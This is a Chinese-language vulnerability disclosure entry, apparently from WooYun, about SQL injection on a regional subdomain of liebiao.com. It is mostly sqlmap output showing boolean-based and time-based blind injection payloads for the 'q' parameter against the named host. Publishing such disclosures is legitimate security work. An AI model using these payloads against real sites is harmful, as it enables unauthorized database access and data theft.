wybug_title: 列表网某分站SQL注入一枚/泄露大量信息
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-10-13：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-11-27：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： rt 详细说明：

Please, always use only valid parameter values so sqlmap could be able to run properly[21:05:15] [INFO] resuming back-end DBMS 'mysql'[21:05:16] [INFO] testing connection to the target URL[21:05:16] [WARNING] reflective value(s) found and filtering outsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: q (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: q=%' AND 2190=2190 AND '%'='    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: q=%' AND (SELECT * FROM (SELECT(SLEEP(5)))aUrH) AND '%'='---[21:05:17] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL 5.0.12[21:05:17] [INFO] fetched data logged to text files under 'C:\Users\wjl\.sqlmap\output\qingdao.liebiao.com'[*] shutting down at 21:05:17
